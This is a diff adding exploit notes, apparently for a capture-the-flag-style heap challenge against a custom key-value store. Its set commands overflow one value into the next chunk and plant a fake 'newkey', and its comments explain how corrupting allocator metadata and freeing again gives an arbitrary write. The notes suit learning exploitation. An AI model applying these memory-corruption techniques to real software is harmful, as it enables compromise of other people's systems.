@@ -1,0 +1,20 @@
+a=1 at 0x00007ffff7dbf020
+b=2 at 0x00007ffff7dbf048
+
+c=12345678
+
+
+cmds:
+
+# initialize
+s a=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+s b=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+# free by making larger
+s a=DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
+# from the 67th char we can set a new key to be found
+# s b=EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
+s b=EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEnewkey=mysexytesteXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+# ^ works, you can get newkey by doing `g newkey`. This means that we can overwerite the metadata of the `newkey` alloc (the Es before) and if we then free newkey again by setting it a larger value, the free function will work on our custom metadata!
+# in the myfree function, the add_to_free_list function is called with the key and the value of the prev. This means we can set an arbitrary value for an arbitrary address
